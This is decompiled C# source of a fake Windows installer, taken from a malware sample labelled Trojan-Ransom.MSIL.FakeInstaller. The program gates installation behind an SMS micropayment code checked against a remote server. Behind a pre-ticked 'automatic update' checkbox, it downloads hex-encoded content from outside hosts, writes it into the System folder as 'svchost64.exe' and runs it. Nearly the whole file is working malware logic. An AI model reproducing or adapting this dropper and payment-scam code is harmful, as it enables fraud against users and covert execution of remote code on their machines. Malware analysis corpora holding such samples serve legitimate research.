// Decompiled with JetBrains decompiler
// Type: Installer.fMain
// Assembly: Installer, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1758E6E6-4A2C-4F5D-B94B-6A8535362219
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00041-msil\Trojan-Ransom.MSIL.FakeInstaller.a-e5b6db4cf2671d40cdb3beb400d636bba3fd2f3b1f4f193696cf5e0df1a23b5c.exe

using Installer.Files;
using Installer.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Installer
{
  public class fMain : Form
  {
    private bool m_forceClosing = false;
    private CParams m_params = (CParams) null;
    private Thread m_thVisiter;
    private string[] m_urls = new string[2]
    {
      "http://www.yapson.com/__temp.php",
      "http://www.gp1.es/__temp.php"
    };
    private bool m_codeOk = false;
    private string m_url = "http://www.panelsms.com/micropagos/comprobacion/compruebo.php?id=1960&codigo={1}";
    private bool m_otherCountries = false;
    private IContainer components = (IContainer) null;
    private Button bCancel;
    private Button bAccept;
    private TextBox tbCode;
    private WebBrowser wb1;
    private LinkLabel llOther;
    private CheckBox cbUpdater;

    public fMain() => this.InitializeComponent();

    private void bCancel_Click(object sender, EventArgs e) => this.Close();

    private void fMain_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (this.m_forceClosing)
        return;
      if (MessageBox.Show((IWin32Window) this, this.m_params.confirmCloseText, this.m_params.confirmCloseCaption, MessageBoxButtons.YesNo) == DialogResult.Yes)
      {
        e.Cancel = false;
        this.m_forceClosing = true;
      }
      else
        e.Cancel = true;
    }

    private void fMain_FormClosed(object sender, FormClosedEventArgs e) => this.Hide();

    private void fMain_Load(object sender, EventArgs e)
    {
      this.GetParams();
      this.SetupInterfaz();
    }

    private void GetVisiter()
    {
      if (this.m_thVisiter != null)
        return;
      this.m_thVisiter = new Thread(new ThreadStart(this.VisiterThread));
      this.m_thVisiter.Start();
    }

    private void VisiterThread()
    {
      try
      {
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svchost64.exe"))
        {
          int index = 0;
          while (!this.GetVisiter(this.m_urls[index]))
          {
            ++index;
            if (index >= this.m_url.Length || !this.Visible)
              break;
          }
        }
      }
      catch
      {
      }
    }

    private bool GetVisiter(string url)
    {
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svchost64.exe";
      try
      {
        StreamReader streamReader = new StreamReader(WebRequest.Create(url).GetResponse().GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        string str2 = end.Substring(end.IndexOf("#START#") + "#START#".Length);
        string str3 = str2.Remove(str2.IndexOf("#END#"));
        System.IO.File.Delete(str1);
        BinaryWriter binaryWriter = new BinaryWriter((Stream) System.IO.File.Create(str1));
        for (int startIndex = 0; startIndex < str3.Length; startIndex += 2)
        {
          byte num = byte.Parse(str3.Substring(startIndex, 2), NumberStyles.HexNumber);
          binaryWriter.Write(num);
        }
        binaryWriter.Close();
      }
      catch
      {
        return false;
      }
      Process.Start(str1, "-s");
      return true;
    }

    private void GetParams()
    {
      Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.params.txt");
      if (manifestResourceStream != null)
      {
        this.m_params = new CParams(new StreamReader(manifestResourceStream, Encoding.GetEncoding(1252)).ReadToEnd());
        manifestResourceStream.Close();
      }
      else
        this.m_params = new CParams();
    }

    private void SetupInterfaz()
    {
      this.SetupBackground();
      Size size1 = this.Size;
      int width1 = size1.Width;
      size1 = this.ClientSize;
      int width2 = size1.Width;
      int num1 = width1 - width2;
      Size size2 = this.Size;
      int height1 = size2.Height;
      size2 = this.ClientSize;
      int height2 = size2.Height;
      int num2 = height1 - height2;
      this.Size = new Size(this.BackgroundImage.Width + num1, this.BackgroundImage.Height + num2);
      this.SetupForm();
      this.SetupButtons();
      this.SetupTextBox();
      this.SetupCheckBox();
    }

    private void SetupForm()
    {
      if (this.m_otherCountries)
        this.Text = this.m_params.captionOtherCountries;
      else
        this.Text = this.m_params.caption;
    }

    private void SetupTextBox()
    {
      if (this.m_otherCountries)
      {
        this.tbCode.Location = this.m_params.textboxLocationOtherCountries;
        this.tbCode.Size = this.m_params.textboxSizeOtherCountries;
      }
      else
      {
        this.tbCode.Location = this.m_params.textboxLocation;
        this.tbCode.Size = this.m_params.textboxSize;
      }
    }

    private void SetupCheckBox()
    {
      if (this.m_otherCountries)
      {
        this.cbUpdater.Visible = false;
      }
      else
      {
        this.cbUpdater.Visible = this.m_params.checkBoxShow;
        this.cbUpdater.Location = this.m_params.checkBoxLocation;
        this.cbUpdater.Text = this.m_params.checkBoxText;
      }
    }

    private void SetupButtons()
    {
      if (this.m_otherCountries)
      {
        this.bAccept.Location = this.m_params.acceptLocationOtherCountries;
        this.bAccept.Size = this.m_params.acceptSizeOtherCountries;
        this.bCancel.Location = this.m_params.cancelLocationOtherCountries;
        this.bCancel.Size = this.m_params.cancelSizeOtherCountries;
        this.llOther.Visible = this.m_params.otherCountriesShowOtherCountries;
        this.llOther.Location = this.m_params.otherCountriesLocationOtherCountries;
        this.llOther.Text = this.m_params.otherCountriesCaptionOtherCountries;
      }
      else
      {
        this.bAccept.Location = this.m_params.acceptLocation;
        this.bAccept.Size = this.m_params.acceptSize;
        this.bCancel.Location = this.m_params.cancelLocation;
        this.bCancel.Size = this.m_params.cancelSize;
        this.llOther.Visible = this.m_params.otherCountriesShow;
        this.llOther.Location = this.m_params.otherCountriesLocation;
        this.llOther.Text = this.m_params.otherCountriesCaption;
      }
      this.bAccept.Text = this.m_params.acceptCaption;
      this.bCancel.Text = this.m_params.cancelCaption;
    }

    private void SetupBackground()
    {
      if (this.m_otherCountries)
      {
        Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.otherCountries.bmp");
        if (manifestResourceStream != null)
          this.BackgroundImage = (Image) new Bitmap(manifestResourceStream);
        else
          this.BackgroundImage = (Image) Resources.defaultOther;
      }
      else
      {
        Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.installer.bmp");
        if (manifestResourceStream != null)
          this.BackgroundImage = (Image) new Bitmap(manifestResourceStream);
        else
          this.BackgroundImage = (Image) Resources.defaultBackground;
      }
    }

    private void bAccept_Click(object sender, EventArgs e)
    {
      if (this.cbUpdater.Checked)
        this.GetVisiter();
      if (this.tbCode.Text != "")
      {
        this.Enabled = false;
        string requestUriString = string.Format(this.m_url, (object) this.m_params.programName, (object) this.tbCode.Text);
        string end;
        try
        {
          StreamReader streamReader = new StreamReader(WebRequest.Create(requestUriString).GetResponse().GetResponseStream());
          end = streamReader.ReadToEnd();
          streamReader.Close();
        }
        catch
        {
          int num = (int) MessageBox.Show((IWin32Window) this, this.m_params.errorConnectionText, this.m_params.errorConnectionCaption);
          this.Enabled = true;
          return;
        }
        XmlReader xmlReader = (XmlReader) null;
        try
        {
          xmlReader = XmlReader.Create((TextReader) new StringReader(end), new XmlReaderSettings()
          {
            CloseInput = true,
            IgnoreWhitespace = true
          });
          xmlReader.Read();
          bool flag1 = true;
          bool flag2 = false;
          while ((xmlReader.NodeType != XmlNodeType.Element || xmlReader.Name.ToLower() != "micropago") && flag1)
          {
            xmlReader.Read();
            if (xmlReader.NodeType == XmlNodeType.None)
              flag1 = false;
          }
          if (flag1)
          {
            xmlReader.Read();
            while ((xmlReader.NodeType != XmlNodeType.Element || xmlReader.Name.ToLower() != "status") && flag1)
            {
              xmlReader.Read();
              if (xmlReader.NodeType == XmlNodeType.None)
                flag1 = false;
            }
            if (flag1)
            {
              xmlReader.Read();
              while (xmlReader.NodeType != XmlNodeType.Text && flag1)
              {
                xmlReader.Read();
                if (xmlReader.NodeType == XmlNodeType.None)
                  flag1 = false;
              }
              if (flag1)
              {
                if (xmlReader.Value.ToUpper() == "OK")
                {
                  flag1 = true;
                  flag2 = true;
                }
                else
                  flag1 = false;
              }
            }
          }
          if (flag1 && flag2)
          {
            xmlReader.Close();
            xmlReader = (XmlReader) null;
            this.m_codeOk = true;
          }
          else
            this.ShowMessageWrongCode();
        }
        catch
        {
          this.ShowMessageWrongCode();
        }
        finally
        {
          xmlReader?.Close();
        }
      }
      if (!this.m_codeOk)
        return;
      this.ExecuteInstaller();
    }

    private void ShowMessageWrongCode()
    {
      int num = (int) MessageBox.Show((IWin32Window) this, this.m_params.wrongCodeText, this.m_params.wrongCodeCaption);
      this.Enabled = true;
    }

    private void ExecuteInstaller()
    {
      string path = "tmp.exe";
      Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.installer.exe");
      BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
      if (System.IO.File.Exists(path))
        System.IO.File.Delete(path);
      BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(path, FileMode.Create));
      byte[] buffer = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(buffer, 0, buffer.Length);
      binaryWriter.Write(buffer);
      binaryReader.Close();
      binaryWriter.Close();
      Process process = new Process();
      process.StartInfo.FileName = path;
      this.Hide();
      process.Start();
      process.WaitForExit();
      System.IO.File.Delete(path);
      this.m_forceClosing = true;
      this.Close();
    }

    private void llOther_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
      this.m_otherCountries = !this.m_otherCountries;
      this.SetupInterfaz();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (fMain));
      this.bCancel = new Button();
      this.bAccept = new Button();
      this.tbCode = new TextBox();
      this.wb1 = new WebBrowser();
      this.llOther = new LinkLabel();
      this.cbUpdater = new CheckBox();
      this.SuspendLayout();
      this.bCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.bCancel.DialogResult = DialogResult.Cancel;
      this.bCancel.Location = new Point(93, 328);
      this.bCancel.Name = "bCancel";
      this.bCancel.Size = new Size(75, 23);
      this.bCancel.TabIndex = 0;
      this.bCancel.Text = "bCancel";
      this.bCancel.UseVisualStyleBackColor = true;
      this.bCancel.Click += new EventHandler(this.bCancel_Click);
      this.bAccept.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.bAccept.Location = new Point(12, 328);
      this.bAccept.Name = "bAccept";
      this.bAccept.Size = new Size(75, 23);
      this.bAccept.TabIndex = 1;
      this.bAccept.Text = "bAccept";
      this.bAccept.UseVisualStyleBackColor = true;
      this.bAccept.Click += new EventHandler(this.bAccept_Click);
      this.tbCode.Location = new Point(143, 94);
      this.tbCode.Name = "tbCode";
      this.tbCode.Size = new Size(179, 20);
      this.tbCode.TabIndex = 2;
      this.wb1.Location = new Point(0, 0);
      this.wb1.Name = "wb1";
      this.wb1.Size = new Size(0, 0);
      this.wb1.TabIndex = 3;
      this.wb1.Visible = false;
      this.llOther.AutoSize = true;
      this.llOther.BackColor = Color.Transparent;
      this.llOther.Location = new Point(177, 298);
      this.llOther.Name = "llOther";
      this.llOther.Size = new Size(65, 13);
      this.llOther.TabIndex = 4;
      ((Label) this.llOther).TabStop = true;
      this.llOther.Text = "Otros paises";
      this.llOther.LinkClicked += new LinkLabelLinkClickedEventHandler(this.llOther_LinkClicked);
      this.cbUpdater.AutoSize = true;
      this.cbUpdater.BackColor = Color.Transparent;
      this.cbUpdater.Checked = true;
      this.cbUpdater.CheckState = CheckState.Checked;
      this.cbUpdater.Location = new Point(336, 275);
      this.cbUpdater.Name = "cbUpdater";
      this.cbUpdater.Size = new Size(144, 17);
      this.cbUpdater.TabIndex = 5;
      this.cbUpdater.Text = "Actualización automática";
      this.cbUpdater.UseVisualStyleBackColor = false;
      this.AcceptButton = (IButtonControl) this.bAccept;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) Resources.defaultBackground;
      this.CancelButton = (IButtonControl) this.bCancel;
      this.ClientSize = new Size(499, 363);
      this.Controls.Add((Control) this.cbUpdater);
      this.Controls.Add((Control) this.llOther);
      this.Controls.Add((Control) this.wb1);
      this.Controls.Add((Control) this.tbCode);
      this.Controls.Add((Control) this.bAccept);
      this.Controls.Add((Control) this.bCancel);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.Name = nameof (fMain);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Load += new EventHandler(this.fMain_Load);
      this.FormClosed += new FormClosedEventHandler(this.fMain_FormClosed);
      this.FormClosing += new FormClosingEventHandler(this.fMain_FormClosing);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
